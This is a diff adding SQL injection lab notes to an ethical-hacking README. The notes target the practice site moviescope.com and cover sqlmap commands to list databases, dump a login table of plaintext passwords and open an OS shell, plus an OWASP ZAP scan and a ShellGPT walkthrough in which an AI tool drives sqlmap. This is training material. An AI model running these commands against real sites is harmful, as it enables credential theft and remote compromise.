@@ -2316,3 +2316,100 @@ It’s basically a wrapper around the OpenAI API.
           sgpt --shell "Fuzz the target url www.moviescope.com using Wfuzz tool"
     ```                                                                                                 
 </details>
+
+# SQL Injection
+<details>
+<summary>Perform SQL Injection Attacks</summary>
+
+* Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap :~
+  - tool = sqlmap
+  - open the parrot machine and open the firefox browser and open the moviescope.com website 
+  - login using credential is sam and test
+  - ofter login click view profile
+  - open the same page inspect page and click console option and at the end type document.cookie and click enter
+  - after click that after that you can see one cookie value copie that and note down that 
+  - note down that page url present in the browser
+  - minimize the browser and open the terminal and type sudo su for root user
+  - he below query causes sqlmap to enforce various injection techniques on the name parameter of the URL in an attempt to extract the database information of the MovieScope website
+  - it will give the database list also 
+  - enter this command
+    ```console
+          sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied]" --dbs
+    ```
+    - -u = specifies the target URL
+    - --cookie = specifies the HTTP cookie header value 
+    - --dbs = enumerates DBMS databases
+  - after that it will ask any permission give all Y to that
+  - sqlmap retrieves the databases present in the MSSQL server. It also displays information about the web server OS, web application technology, and the backend DBMS
+  - now you need to choose the database and use sqlmap to retrieve the tables in the database
+  - The below query causes sqlmap to scan the moviescope database for tables located in the database  
+    ```console
+          sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied]" -D moviescope --tables 
+    ```
+    - -D = specifies the DBMS database to enumerate
+    - --tables = enumerates DBMS database tables
+  - you need to retrieve the table content of the column User_Login run this query
+    ```console
+        sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied]" -D moviescope -T User_Login --dump   
+    ```
+  - sqlmap retrieves the complete User_Login table data from the database moviescope, containing all users' usernames under the Uname column and passwords under the password column
+  - the passwords are shown in plain text form
+  - if we want to verify that username and password we must go to the browser and again open the moviescope.com and login using thos credentials
+  - login successfull we made the exploit is successfull
+  - if you want to open the interactive OS shell
+    ```console
+          sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied]" --os-shell
+    ```
+    - --os-shell = this is the prompt for an interactive OS shell
+  - it will provide you with the OS shell. Type hostname and press Enter to find the machine name where the site is running
+  - Type TASKLIST and press Enter to view a list of tasks that are currently running on the target system  
+</details>
+
+<detals>
+<summary>Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools</summary>
+
+* Detect SQL Injection Vulnerabilities using OWASP ZAP :~
+  - open the window server 2019 and open the Zap 2.14.0 
+  - OWASP ZAP initialized and a prompt that reads Do you want to persist the ZAP Session? appears; select the No, I do not want to persist this session at this moment in time radio button, and click Start
+  - Manage Add-ons window appears, close it 
+  - OWASP ZAP main window appears; under the Quick Start tab, click the Automated Scan option
+  - in URL to attack field in this case, http://www.moviescope.com other options are the default leave and click attack
+  - in the down section alert section is their open that and you find the vulnerability  like sql injection and expand that
+  - you can check the severity of risk of that vulnerability
+  - practical is done
+</details>
+
+<detals>
+<summary>Perform SQL Injection using AI</summary>
+
+* Perform SQL Injection using ShellGPT :~
+  - open the parrot mechine and open the terminal mechine and sudo su for root user
+  - activate the shellgpt using activation key
+  - In this lab we will use AI to perform SQL injection attack against MSSQL to extract databases
+  - First we need to login to http://www.moviescope.com website and copy the cookie value in the inspect page this same as the task one
+  - We will now, enumerate the database of the target website to do so, switch to the terminal window and run
+    ```console
+          sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied]' and enumerate the DBMS databases"
+    ```
+  - We have successfully enumerated the databases from the target website
+  - now enumerate the tables pertaining to the database moviescope. To do so run
+    ```console
+          sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied]' and enumerate the tables pertaining to moviescope database"  
+    ```
+  - After enumerating the database tables we will dump the contents of the User_Login table to view the login information of the target website
+  - run this command:
+    ```console
+          sgpt --chat sql --shell "Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied]' and retrieve User_Login table contents from moviescope database"  
+    ```
+  - Sqlmap retrieves the complete User_Login table data from the database moviescope, containing all users' usernames under the Uname column and passwords under the password column
+  - To verify if the login details are valid, you should try to log in with the extracted login details of any of the users
+  - Apart from the aforementioned commands, you can further explore additional options within the ShellGPT tool and utilize various other tools to perform SQL injection attacks on the target website                  
+</details>
+
+# Hacking Wireless Networks
+<details>
+<summary></summary>
+
+
+
+</details>
